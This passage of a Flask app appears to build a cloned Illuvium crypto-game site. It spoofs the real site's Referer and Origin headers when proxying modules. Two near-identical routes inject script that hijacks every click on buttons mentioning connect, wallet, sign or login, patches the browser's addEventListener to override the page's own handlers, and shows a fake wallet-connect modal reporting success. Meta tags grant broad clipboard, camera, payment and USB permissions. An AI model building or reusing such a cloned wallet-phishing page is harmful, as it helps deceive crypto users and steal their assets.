        # Forward the request to esm.sh
        url = f"https://esm.sh/{path}"
        
        # Pass along query parameters
        if request.query_string:
            url += f"?{request.query_string.decode('utf-8')}"
            
        # Make the request with proper headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': request.headers.get('Referer', 'https://www.illuvium.io/'),
            'Origin': request.headers.get('Origin', 'https://www.illuvium.io')
        }
        
        # Make the request
        esm_response = requests.get(url, headers=headers, timeout=10)
        
        # If we get a redirect, follow it manually
        if esm_response.status_code in (301, 302, 303, 307, 308) and 'Location' in esm_response.headers:
            redirect_url = esm_response.headers['Location']
            esm_response = requests.get(redirect_url, headers=headers, timeout=10)
        
        # Create a Flask response with the same content
        response = Response(
            esm_response.content,
            status=esm_response.status_code,
            content_type=esm_response.headers.get('Content-Type', 'application/javascript')
        )
        
        # Add comprehensive CORS headers
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'GET, HEAD, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Origin, Accept, Content-Type, X-Requested-With, Authorization'
        response.headers['Access-Control-Expose-Headers'] = 'Content-Length, Content-Range'
        response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
        response.headers['Cross-Origin-Opener-Policy'] = 'unsafe-none'
        response.headers['Cross-Origin-Embedder-Policy'] = 'unsafe-none'
        
        # Add headers for the correct handling of JavaScript modules
        response.headers['X-Content-Type-Options'] = 'nosniff'
        
        # Cache ESM modules for a short time to improve performance
        response.headers['Cache-Control'] = 'max-age=300'  # 5 minutes
        
        # Copy important headers from the original response if present
        for header in ['ETag', 'Last-Modified', 'Content-Disposition']:
            if header in esm_response.headers:
                response.headers[header] = esm_response.headers[header]
        
        return response
    except Exception as e:
        logger.error(f"Error proxying ESM request: {str(e)}")
        logger.error(f"Error details: {str(getattr(e, '__dict__', {}))}")
        
        # Create a stub ESM module as fallback
        stub_content = f"// Stub ESM module for {path}\nconsole.warn('Failed to load ESM module: {path}');\nexport default {{}};"
        response = Response(
            stub_content,
            status=200,
            content_type='application/javascript'
        )
        
        # Add CORS headers
        response.headers['Access-Control-Allow-Origin'] = '*' 
        response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
        
        return response

@app.route('/_next/images/<path:image_path>', methods=['GET', 'HEAD', 'OPTIONS'])
def serve_next_images_directly(image_path):
    """
    Special handler for Next.js image paths.
    Fixes the 404 errors for /_next/images paths by checking both the _next directory
    and regular images directory
    """
    logger.info(f"Handling _next/images request: {image_path}")
    
    # Try finding in both possible locations
    possible_paths = [
        os.path.join(app.root_path, '_next', 'images', image_path),
        os.path.join(app.root_path, 'images', image_path),
        os.path.join(app.root_path, 'static', 'images', image_path)
    ]
    
    # For subdirectories like play-now/explore-planet, try to match them
    for path in possible_paths:
        if os.path.exists(path):
            logger.info(f"Found image at: {path}")
            
            # Determine MIME type based on extension
            mime_type = None
            if path.endswith('.webp'):
                mime_type = 'image/webp'
            elif path.endswith('.png'):
                mime_type = 'image/png'
            elif path.endswith('.jpg') or path.endswith('.jpeg'):
                mime_type = 'image/jpeg'
            elif path.endswith('.svg'):
                mime_type = 'image/svg+xml'
            elif path.endswith('.gif'):
                mime_type = 'image/gif'
                
            # Serve the file with proper headers
            response = send_file(path, mimetype=mime_type)
            
            # Add comprehensive CORS headers
            response.headers['Access-Control-Allow-Origin'] = '*'
            response.headers['Access-Control-Allow-Methods'] = 'GET, HEAD, OPTIONS'
            response.headers['Access-Control-Allow-Headers'] = 'Origin, Accept, Content-Type, X-Requested-With'
            response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
            response.headers['Cross-Origin-Opener-Policy'] = 'unsafe-none'
            response.headers['Cross-Origin-Embedder-Policy'] = 'unsafe-none'
            
            return response
    
    # If file wasn't found, check if it's in a subdirectory structure
    # that might be mapped differently
    subdir_path = None
    if '/' in image_path:
        parts = image_path.split('/')
        # Check in play-now and other common directories
        possible_img_dirs = ['play-now', 'explore-planet', 'header', 'general']
        
        for img_dir in possible_img_dirs:
            subdir_path = os.path.join(app.root_path, 'images', img_dir, parts[-1])
            if os.path.exists(subdir_path):
                logger.info(f"Found image in subdirectory: {subdir_path}")
                response = send_file(subdir_path, mimetype='image/webp')
                response.headers['Access-Control-Allow-Origin'] = '*'
                response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
                return response
    
    # If not found, create placeholder
    logger.warning(f"Image not found: {image_path}, creating placeholder")
    placeholder_path = os.path.join(app.root_path, 'static', 'fallbacks', 'placeholder.webp')
    if os.path.exists(placeholder_path):
        response = send_file(placeholder_path, mimetype='image/webp')
    else:
        # Generate a simple placeholder if no fallback exists
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(placeholder_path), exist_ok=True)
        
        # Create a simple placeholder image
        img = Image.new('RGB', (400, 300), color=(150, 150, 150))
        draw = ImageDraw.Draw(img)
        draw.rectangle([0, 0, 399, 299], outline=(100, 100, 100))
        img.save(placeholder_path)
        
        response = send_file(placeholder_path, mimetype='image/webp')
    
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
    response.headers['Cross-Origin-Opener-Policy'] = 'unsafe-none'
    
    return response

# Add a route to serve the modal.bundle.js file with the correct MIME type
@app.route('/static/js/modal.bundle.js', methods=['GET', 'HEAD', 'OPTIONS'])
def serve_modal_bundle_js():
    """Directly serve the modal.bundle.js file with proper MIME type"""
    logger.info("Serving modal.bundle.js file")
    file_path = os.path.join(app.root_path, 'static', 'js', 'modal.bundle.js')
    
    # If file doesn't exist, create an empty one
    if not os.path.exists(file_path):
        logger.info("Creating empty modal.bundle.js file")
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with open(file_path, 'w') as f:
            f.write('// Modal bundle JS\nconsole.log("[Modal] Bundle loaded");')
    
    # Serve the file with the correct MIME type
    response = send_file(file_path, mimetype='application/javascript')
    
    # Add headers for proper CORS and caching
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Cross-Origin-Resource-Policy'] = 'cross-origin'
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    
    return response

# Add a route to export a more complete version of the site as static HTML
@app.route('/export-static', methods=['GET'])
def export_static():
    """Export the site as static HTML with inline CSS and JS for easy button control"""
    
    # Get the original HTML
    html = render_template('index.html')
    
    # Try to embed key images as base64
    embedded_images = {}
    try:
        # Attempt to load and convert key images to base64
        from base64 import b64encode
        import os, mimetypes
        
        # List of key images to embed
        key_images = [
            'images/play-now/logos/logo-overworld.webp',
            'images/play-now/logos/logo-arena.webp',
            'images/play-now/logos/logo-zero.webp',
            'images/home/hero-bg.webp'
        ]
        
        for img_path in key_images:
            full_path = os.path.join(app.root_path, img_path)
            if os.path.exists(full_path):
                mime_type = mimetypes.guess_type(full_path)[0] or 'image/webp'
                with open(full_path, 'rb') as img_file:
                    img_data = b64encode(img_file.read()).decode('utf-8')
                    embedded_images[img_path] = f"data:{mime_type};base64,{img_data}"
    except Exception as e:
        logger.error(f"Error embedding images: {str(e)}")
    
    # Add our custom scripts inline
    script_content = """
    <script type="text/javascript">
    // Global wallet config
    window.WALLET_CONFIG = {
        modalId: 'wallet-connect-modal',
        debug: true
    };
    
    // Mock essential Next.js functionality to prevent errors
    window.__NEXT_DATA__ = {
        props: {
            pageProps: {},
            __N_SSG: true
        },
        page: "/",
        query: {},
        buildId: "development"
    };
    
    // Include additional Next.js stubs to prevent errors
    window.__NEXT_LOADED_PAGES = [{ "route": "/", "fn": function() {} }];
    window.__NEXT_REGISTER_PAGE = function() {};
    window.__NEXT_P = [];
    
    // Embedded image data
    window.EMBEDDED_IMAGES = {
    """
    
    # Add embedded images data
    for path, data_url in embedded_images.items():
        script_content += f"    '{path}': '{data_url}',\n"
    
    script_content += """    };
    
    // Wait for DOM to be ready
    document.addEventListener('DOMContentLoaded', function() {
        console.log('[Static Export] DOM ready, initializing wallet connect');
        
        // Create the modal
        createWalletModal();
        
        // Intercept all buttons
        interceptAllButtons();
        
        // Attempt to load core images
        loadEssentialImages();
    });
    
    // Load essential images for the static version
    function loadEssentialImages() {
        const imagesToPreload = [
            '/images/play-now/header/header.webp',
            '/images/play-now/explore-planet/illuvium-planet.webp',
            '/images/play-now/explore-planet/brightland-steppes.webp',
            '/images/play-now/explore-planet/crimson-waste.webp',
            '/images/play-now/logos/logo-overworld.webp',
            '/images/play-now/logos/logo-arena.webp',
            '/images/play-now/logos/logo-zero.webp',
            '/images/play-now/logos/logo-beyond.webp',
            '/images/home/hero-bg.webp'
        ];
        
        imagesToPreload.forEach(src => {
            const img = new Image();
            
            // Check if we have embedded version of this image
            if (window.EMBEDDED_IMAGES && window.EMBEDDED_IMAGES[src.replace(/^\//, '')]) {
                img.src = window.EMBEDDED_IMAGES[src.replace(/^\//, '')];
            } else {
                img.src = src;
            }
        });
    }
    
    // Create wallet modal
    function createWalletModal() {
        const modalId = window.WALLET_CONFIG.modalId;
        
        // Create modal if it doesn't exist
        if (!document.getElementById(modalId)) {
            const modalHtml = `
            <div id="${modalId}" class="wallet-connect-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(14, 12, 29, 0.85); z-index: 9999; overflow: auto;">
                <div class="wallet-connect-backdrop" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%;" onclick="hideWalletModal()"></div>
                <div class="wallet-connect-dialog" style="position: relative; background-color: #1f1b41; margin: 10% auto; padding: 24px; border-radius: 12px; max-width: 500px; box-shadow: 0 15px 30px rgba(0,0,0,0.4); border: 1px solid #302a65;">
                    <div class="wallet-connect-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                        <h3 style="margin: 0; color: #fff; font-size: 1.5rem;">Connect Wallet</h3>
                        <button style="background: none; border: none; font-size: 20px; cursor: pointer; color: #fff;" onclick="hideWalletModal()">×</button>
                    </div>
                    <div class="wallet-connect-content">
                        <p style="margin-bottom: 20px; color: #bbb;">Please select a wallet to connect:</p>
                        <div class="wallet-options" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                            <button class="wallet-option" style="display: flex; align-items: center; padding: 12px; border: 1px solid #302a65; border-radius: 8px; background: #1a1632; cursor: pointer; color: #fff;" onclick="connectWallet('metamask')">
                                <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" style="width: 30px; height: 30px; margin-right: 10px;">
                                MetaMask
                            </button>
                            <button class="wallet-option" style="display: flex; align-items: center; padding: 12px; border: 1px solid #302a65; border-radius: 8px; background: #1a1632; cursor: pointer; color: #fff;" onclick="connectWallet('walletconnect')">
                                <img src="https://cdn.jsdelivr.net/gh/WalletConnect/walletconnect-assets/png/circle/walletconnect-circle-blue.png" style="width: 30px; height: 30px; margin-right: 10px;">
                                WalletConnect
                            </button>
                            <button class="wallet-option" style="display: flex; align-items: center; padding: 12px; border: 1px solid #302a65; border-radius: 8px; background: #1a1632; cursor: pointer; color: #fff;" onclick="connectWallet('coinbase')">
                                <img src="https://cdn.jsdelivr.net/gh/coinbase/wallet-assets/images/base.svg" style="width: 30px; height: 30px; margin-right: 10px;">
                                Coinbase
                            </button>
                            <button class="wallet-option" style="display: flex; align-items: center; padding: 12px; border: 1px solid #302a65; border-radius: 8px; background: #1a1632; cursor: pointer; color: #fff;" onclick="connectWallet('trustwallet')">
                                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" style="width: 30px; height: 30px; margin-right: 10px;">
                                Trust Wallet
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            `;
            
            // Append modal to body
            document.body.insertAdjacentHTML('beforeend', modalHtml);
            console.log('[Static Export] Wallet modal created');
        }
    }
    
    // Show the wallet modal
    function showWalletModal() {
        const modal = document.getElementById(window.WALLET_CONFIG.modalId);
        if (modal) {
            modal.style.display = 'flex';
            console.log('[Static Export] Showing wallet modal');
        }
    }
    
    // Hide the wallet modal
    function hideWalletModal() {
        const modal = document.getElementById(window.WALLET_CONFIG.modalId);
        if (modal) {
            modal.style.display = 'none';
            console.log('[Static Export] Hiding wallet modal');
        }
    }
    
    // Connect a specific wallet
    function connectWallet(walletType) {
        console.log(`[Static Export] Connecting to ${walletType}...`);
        
        // Simulate connection
        setTimeout(() => {
            console.log(`[Static Export] Connected to ${walletType}`);
            hideWalletModal();
            alert(`Successfully connected to ${walletType}`);
        }, 1000);
    }
    
    // Intercept all buttons in the document
    function interceptAllButtons() {
        // Target all buttons, anchors and clickable elements
        document.addEventListener('click', function(e) {
            // Check the clicked element
            const target = e.target;
            const button = target.closest('button');
            const link = target.closest('a');
            const clickable = button || link;
            
            if (clickable) {
                const text = clickable.textContent || '';
                console.log(`[Static Export] Clicked element: ${text.trim()}`);
                
                // Check if this might be a wallet-related button
                const walletKeywords = ['connect', 'wallet', 'sign', 'web3', 'login'];
                const isWalletButton = walletKeywords.some(keyword => 
                    text.toLowerCase().includes(keyword)
                );
                
                if (isWalletButton) {
                    console.log('[Static Export] Wallet button detected, showing modal');
                    e.preventDefault();
                    e.stopPropagation();
                    showWalletModal();
                    return false;
                }
            }
        }, true); // Use capture phase to intercept events early
        
        console.log('[Static Export] Button interception set up');
        
        // Force the first few modal creations after slight delays to ensure it works with slow-loading elements
        setTimeout(() => { 
            console.log('[Static Export] Installing deep click handlers');
            
            // Force creation of modal (again) and ensure it's not duplicated
            createWalletModal();
            
            // Add direct React event system override
            const realAddEventListener = EventTarget.prototype.addEventListener;
            EventTarget.prototype.addEventListener = function(type, listener, options) {
                // Handle React's event system
                if (type === 'click') {
                    const originalListener = listener;
                    listener = function(e) {
                        const target = e.target;
                        const text = target.textContent || '';
                        
                        // Check if this might be a wallet button
                        if (text.toLowerCase().includes('connect') || 
                            text.toLowerCase().includes('wallet') || 
                            text.toLowerCase().includes('sign') ||
                            text.toLowerCase().includes('login')) {
                            
                            console.log('[Static Export] Intercepted React click on wallet button');
                            e.preventDefault();
                            e.stopPropagation();
                            showWalletModal();
                            return false;
                        }
                        
                        return originalListener.apply(this, arguments);
                    };
                }
                
                return realAddEventListener.call(this, type, listener, options);
            };
        }, 1000);
    }
    </script>
    
    <style type="text/css">
    /* Custom styles for wallet modal */
    .wallet-connect-modal {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    
    .wallet-option:hover {
        background-color: #2a2448 !important;
        border-color: #4b3fac !important;
    }

    /* Add basic page styling */
    body {
        background-color: #0E0C1D; 
        color: #ffffff;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        margin: 0;
        padding: 0;
        min-height: 100vh;
    }

    /* Style for the connect wallet button to match the image */
    .connect-wallet-btn {
        background-color: #66dbff;
        color: #14112a;
        font-weight: bold;
        padding: 10px 24px;
        border-radius: 6px;
        border: none;
        font-size: 16px;
        cursor: pointer;
        transition: background-color 0.2s;
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 1000;
    }
    
    .connect-wallet-btn:hover {
        background-color: #5ac7e8;
    }

    /* Main content area */
    .main-content {
        max-width: 1200px;
        margin: 0 auto;
        padding: 100px 20px;
    }

    .hero-section {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        min-height: 80vh;
    }

    .hero-section h1 {
        font-size: 3rem;
        margin-bottom: 20px;
        background: linear-gradient(90deg, #66dbff, #b673f8);
        -webkit-background-clip: text;
        background-clip: text;
        -webkit-text-fill-color: transparent;
    }

    .hero-section p {
        font-size: 1.25rem;
        max-width: 600px;
        margin-bottom: 40px;
        color: #a9a9b9;
    }

    /* Game cards section */
    .game-cards {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        gap: 20px;
        margin-top: 60px;
    }

    .game-card {
        background-color: rgba(31, 27, 65, 0.7);
        border: 1px solid #302a65;
        border-radius: 12px;
        padding: 25px;
        width: 280px;
        text-align: center;
        transition: transform 0.3s, box-shadow 0.3s;
    }

    .game-card:hover {
        transform: translateY(-5px);
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
    }

    .game-card img {
        width: 100px;
        height: 100px;
        margin-bottom: 15px;
    }

    .game-card h3 {
        color: #66dbff;
        margin-bottom: 10px;
    }

    .game-card p {
        color: #a9a9b9;
        font-size: 0.9rem;
        line-height: 1.5;
    }
    </style>
    
    <!-- Add a basic UI structure for better visual representation -->
    <div id="main-app">
        <button class="connect-wallet-btn" onclick="showWalletModal()">Connect Wallet</button>
        
        <div class="main-content">
            <div class="hero-section">
                <h1>Welcome to Illuvium</h1>
                <p>Explore the planet, capture Illuvials, and join the adventure in this immersive gaming experience.</p>
                
                <div class="game-cards">
                    <div class="game-card">
                        <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" alt="Illuvium Overworld">
                        <h3>Illuvium Overworld</h3>
                        <p>Explore vast landscapes and collect rare creatures in this open-world adventure.</p>
                    </div>
                    <div class="game-card">
                        <img src="https://cdn.jsdelivr.net/gh/WalletConnect/walletconnect-assets/png/circle/walletconnect-circle-blue.png" alt="Illuvium Arena">
                        <h3>Illuvium Arena</h3>
                        <p>Battle other players in strategic auto-battler competitions with your Illuvials.</p>
                    </div>
                    <div class="game-card">
                        <img src="https://cdn.jsdelivr.net/gh/coinbase/wallet-assets/images/base.svg" alt="Illuvium Zero">
                        <h3>Illuvium Zero</h3>
                        <p>Build and manage your own industrial complex in this resource management game.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    """
    
    # Insert the script and styles before closing body tag
    html = html.replace('</body>', script_content + '</body>')
    
    # Add permission meta tags
    permission_meta_tags = """
    <meta http-equiv="Permissions-Policy" content="clipboard-read=*, clipboard-write=*, web-share=*, accelerometer=*, ambient-light-sensor=*, camera=*, geolocation=*, gyroscope=*, magnetometer=*, microphone=*, payment=*, usb=*, interest-cohort=()">
    <meta http-equiv="Cross-Origin-Opener-Policy" content="unsafe-none">
    <meta http-equiv="Cross-Origin-Embedder-Policy" content="unsafe-none">
    <meta http-equiv="Cross-Origin-Resource-Policy" content="cross-origin">
    """
    html = html.replace('</head>', permission_meta_tags + '</head>')
    
    # Create a download response
    response = make_response(html)
    response.headers["Content-Disposition"] = "attachment; filename=exported-site.html"
    response.headers["Content-Type"] = "text/html"
    
    return response

# Also add a route to serve the static version directly 
@app.route('/static-version', methods=['GET'])
def static_version():
    """Serve a static version of the site with inline wallet modal functionality"""
    
    # Get the original HTML
    html = render_template('index.html')
    
    # Try to embed key images as base64
    embedded_images = {}
    try:
        # Attempt to load and convert key images to base64
        from base64 import b64encode
        import os, mimetypes
        
        # List of key images to embed
        key_images = [
            'images/play-now/logos/logo-overworld.webp',
            'images/play-now/logos/logo-arena.webp',
            'images/play-now/logos/logo-zero.webp',
            'images/home/hero-bg.webp'
        ]
        
        for img_path in key_images:
            full_path = os.path.join(app.root_path, img_path)
            if os.path.exists(full_path):
                mime_type = mimetypes.guess_type(full_path)[0] or 'image/webp'
                with open(full_path, 'rb') as img_file:
                    img_data = b64encode(img_file.read()).decode('utf-8')
                    embedded_images[img_path] = f"data:{mime_type};base64,{img_data}"
    except Exception as e:
        logger.error(f"Error embedding images: {str(e)}")
    
    # Add our custom scripts inline
    script_content = """
    <script type="text/javascript">
    // Global wallet config
    window.WALLET_CONFIG = {
        modalId: 'wallet-connect-modal',
        debug: true
    };
    
    // Mock essential Next.js functionality to prevent errors
    window.__NEXT_DATA__ = {
        props: {
            pageProps: {},
            __N_SSG: true
        },
        page: "/",
        query: {},
        buildId: "development"
    };
    
    // Include additional Next.js stubs to prevent errors
    window.__NEXT_LOADED_PAGES = [{ "route": "/", "fn": function() {} }];
    window.__NEXT_REGISTER_PAGE = function() {};
    window.__NEXT_P = [];
    
    // Embedded image data
    window.EMBEDDED_IMAGES = {
    """
    
    # Add embedded images data
    for path, data_url in embedded_images.items():
        script_content += f"    '{path}': '{data_url}',\n"
    
    script_content += """    };
    
    // Wait for DOM to be ready
    document.addEventListener('DOMContentLoaded', function() {
        console.log('[Static Version] DOM ready, initializing wallet connect');
        
        // Create the modal
        createWalletModal();
        
        // Intercept all buttons
        interceptAllButtons();
        
        // Attempt to load core images
        loadEssentialImages();
    });
    
    // Load essential images for the static version
    function loadEssentialImages() {
        const imagesToPreload = [
            '/images/play-now/header/header.webp',
            '/images/play-now/explore-planet/illuvium-planet.webp',
            '/images/play-now/explore-planet/brightland-steppes.webp',
            '/images/play-now/explore-planet/crimson-waste.webp',
            '/images/play-now/logos/logo-overworld.webp',
            '/images/play-now/logos/logo-arena.webp',
            '/images/play-now/logos/logo-zero.webp',
            '/images/play-now/logos/logo-beyond.webp',
            '/images/home/hero-bg.webp'
        ];
        
        imagesToPreload.forEach(src => {
            const img = new Image();
            
            // Check if we have embedded version of this image
            if (window.EMBEDDED_IMAGES && window.EMBEDDED_IMAGES[src.replace(/^\//, '')]) {
                img.src = window.EMBEDDED_IMAGES[src.replace(/^\//, '')];
            } else {
                img.src = src;
            }
        });
    }
    
    // Create wallet modal
    function createWalletModal() {
        const modalId = window.WALLET_CONFIG.modalId;
        
        // Create modal if it doesn't exist
        if (!document.getElementById(modalId)) {
            const modalHtml = `
            <div id="${modalId}" class="wallet-connect-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(14, 12, 29, 0.85); z-index: 9999; overflow: auto;">
                <div class="wallet-connect-backdrop" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%;" onclick="hideWalletModal()"></div>
                <div class="wallet-connect-dialog" style="position: relative; background-color: #1f1b41; margin: 10% auto; padding: 24px; border-radius: 12px; max-width: 500px; box-shadow: 0 15px 30px rgba(0,0,0,0.4); border: 1px solid #302a65;">
                    <div class="wallet-connect-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                        <h3 style="margin: 0; color: #fff; font-size: 1.5rem;">Connect Wallet</h3>
                        <button style="background: none; border: none; font-size: 20px; cursor: pointer; color: #fff;" onclick="hideWalletModal()">×</button>
                    </div>
                    <div class="wallet-connect-content">
                        <p style="margin-bottom: 20px; color: #bbb;">Please select a wallet to connect:</p>
                        <div class="wallet-options" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                            <button class="wallet-option" style="display: flex; align-items: center; padding: 12px; border: 1px solid #302a65; border-radius: 8px; background: #1a1632; cursor: pointer; color: #fff;" onclick="connectWallet('metamask')">
                                <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" style="width: 30px; height: 30px; margin-right: 10px;">
                                MetaMask
                            </button>
                            <button class="wallet-option" style="display: flex; align-items: center; padding: 12px; border: 1px solid #302a65; border-radius: 8px; background: #1a1632; cursor: pointer; color: #fff;" onclick="connectWallet('walletconnect')">
                                <img src="https://cdn.jsdelivr.net/gh/WalletConnect/walletconnect-assets/png/circle/walletconnect-circle-blue.png" style="width: 30px; height: 30px; margin-right: 10px;">
                                WalletConnect
                            </button>
                            <button class="wallet-option" style="display: flex; align-items: center; padding: 12px; border: 1px solid #302a65; border-radius: 8px; background: #1a1632; cursor: pointer; color: #fff;" onclick="connectWallet('coinbase')">
                                <img src="https://cdn.jsdelivr.net/gh/coinbase/wallet-assets/images/base.svg" style="width: 30px; height: 30px; margin-right: 10px;">
                                Coinbase
                            </button>
                            <button class="wallet-option" style="display: flex; align-items: center; padding: 12px; border: 1px solid #302a65; border-radius: 8px; background: #1a1632; cursor: pointer; color: #fff;" onclick="connectWallet('trustwallet')">
                                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" style="width: 30px; height: 30px; margin-right: 10px;">
                                Trust Wallet
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            `;
            
            // Append modal to body
            document.body.insertAdjacentHTML('beforeend', modalHtml);
            console.log('[Static Version] Wallet modal created');
        }
    }
    
    // Show the wallet modal
    function showWalletModal() {
        const modal = document.getElementById(window.WALLET_CONFIG.modalId);
        if (modal) {
            modal.style.display = 'flex';
            console.log('[Static Version] Showing wallet modal');
        }
    }
    
    // Hide the wallet modal
    function hideWalletModal() {
        const modal = document.getElementById(window.WALLET_CONFIG.modalId);
        if (modal) {
            modal.style.display = 'none';
            console.log('[Static Version] Hiding wallet modal');
        }
    }
    
    // Connect a specific wallet
    function connectWallet(walletType) {
        console.log(`[Static Version] Connecting to ${walletType}...`);
        
        // Simulate connection
        setTimeout(() => {
            console.log(`[Static Version] Connected to ${walletType}`);
            hideWalletModal();
            alert(`Successfully connected to ${walletType}`);
        }, 1000);
    }
    
    // Intercept all buttons in the document
    function interceptAllButtons() {
        // Target all buttons, anchors and clickable elements
        document.addEventListener('click', function(e) {
            // Check the clicked element
            const target = e.target;
            const button = target.closest('button');
            const link = target.closest('a');
            const clickable = button || link;
            
            if (clickable) {
                const text = clickable.textContent || '';
                console.log(`[Static Version] Clicked element: ${text.trim()}`);
                
                // Check if this might be a wallet-related button
                const walletKeywords = ['connect', 'wallet', 'sign', 'web3', 'login'];
                const isWalletButton = walletKeywords.some(keyword => 
                    text.toLowerCase().includes(keyword)
                );
                
                if (isWalletButton) {
                    console.log('[Static Version] Wallet button detected, showing modal');
                    e.preventDefault();
                    e.stopPropagation();
                    showWalletModal();
                    return false;
                }
            }
        }, true); // Use capture phase to intercept events early
        
        console.log('[Static Version] Button interception set up');
        
        // Force the first few modal creations after slight delays to ensure it works with slow-loading elements
        setTimeout(() => { 
            console.log('[Static Version] Installing deep click handlers');
            
            // Force creation of modal (again) and ensure it's not duplicated
            createWalletModal();
            
            // Add direct React event system override
            const realAddEventListener = EventTarget.prototype.addEventListener;
            EventTarget.prototype.addEventListener = function(type, listener, options) {
                // Handle React's event system
                if (type === 'click') {
                    const originalListener = listener;
                    listener = function(e) {
                        const target = e.target;
                        const text = target.textContent || '';
                        
                        // Check if this might be a wallet button
                        if (text.toLowerCase().includes('connect') || 
                            text.toLowerCase().includes('wallet') || 
                            text.toLowerCase().includes('sign') ||
                            text.toLowerCase().includes('login')) {
                            
                            console.log('[Static Version] Intercepted React click on wallet button');
                            e.preventDefault();
                            e.stopPropagation();
                            showWalletModal();
                            return false;
                        }
                        
                        return originalListener.apply(this, arguments);
                    };
                }
                
                return realAddEventListener.call(this, type, listener, options);
            };
        }, 1000);
    }
    </script>
    
    <style type="text/css">
    /* Custom styles for wallet modal */
    .wallet-connect-modal {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    
    .wallet-option:hover {
        background-color: #2a2448 !important;
        border-color: #4b3fac !important;
    }

    /* Add basic page styling */
    body {
        background-color: #0E0C1D; 
        color: #ffffff;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        margin: 0;
        padding: 0;
        min-height: 100vh;
    }

    /* Style for the connect wallet button to match the image */
    .connect-wallet-btn {
        background-color: #66dbff;
        color: #14112a;
        font-weight: bold;
        padding: 10px 24px;
        border-radius: 6px;
        border: none;
        font-size: 16px;
        cursor: pointer;
        transition: background-color 0.2s;
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 1000;
    }
    
    .connect-wallet-btn:hover {
        background-color: #5ac7e8;
    }

    /* Main content area */
    .main-content {
        max-width: 1200px;
        margin: 0 auto;
        padding: 100px 20px;
    }

    .hero-section {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        min-height: 80vh;
    }

    .hero-section h1 {
        font-size: 3rem;
        margin-bottom: 20px;
        background: linear-gradient(90deg, #66dbff, #b673f8);
        -webkit-background-clip: text;
        background-clip: text;
        -webkit-text-fill-color: transparent;
    }

    .hero-section p {
        font-size: 1.25rem;
        max-width: 600px;
        margin-bottom: 40px;
        color: #a9a9b9;
    }

    /* Game cards section */
    .game-cards {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        gap: 20px;
        margin-top: 60px;
    }

    .game-card {
        background-color: rgba(31, 27, 65, 0.7);
        border: 1px solid #302a65;
        border-radius: 12px;
        padding: 25px;
        width: 280px;
        text-align: center;
        transition: transform 0.3s, box-shadow 0.3s;
    }

    .game-card:hover {
        transform: translateY(-5px);
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
    }

    .game-card img {
        width: 100px;
        height: 100px;
        margin-bottom: 15px;
    }

    .game-card h3 {
        color: #66dbff;
        margin-bottom: 10px;
    }

    .game-card p {
        color: #a9a9b9;
        font-size: 0.9rem;
        line-height: 1.5;
    }
    </style>
    
    <!-- Add a basic UI structure for better visual representation -->
    <div id="main-app">
        <button class="connect-wallet-btn" onclick="showWalletModal()">Connect Wallet</button>
        
        <div class="main-content">
            <div class="hero-section">
                <h1>Welcome to Illuvium</h1>
                <p>Explore the planet, capture Illuvials, and join the adventure in this immersive gaming experience.</p>
                
                <div class="game-cards">
                    <div class="game-card">
                        <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" alt="Illuvium Overworld">
                        <h3>Illuvium Overworld</h3>
                        <p>Explore vast landscapes and collect rare creatures in this open-world adventure.</p>
                    </div>
                    <div class="game-card">
                        <img src="https://cdn.jsdelivr.net/gh/WalletConnect/walletconnect-assets/png/circle/walletconnect-circle-blue.png" alt="Illuvium Arena">
                        <h3>Illuvium Arena</h3>
                        <p>Battle other players in strategic auto-battler competitions with your Illuvials.</p>
                    </div>
                    <div class="game-card">
                        <img src="https://cdn.jsdelivr.net/gh/coinbase/wallet-assets/images/base.svg" alt="Illuvium Zero">
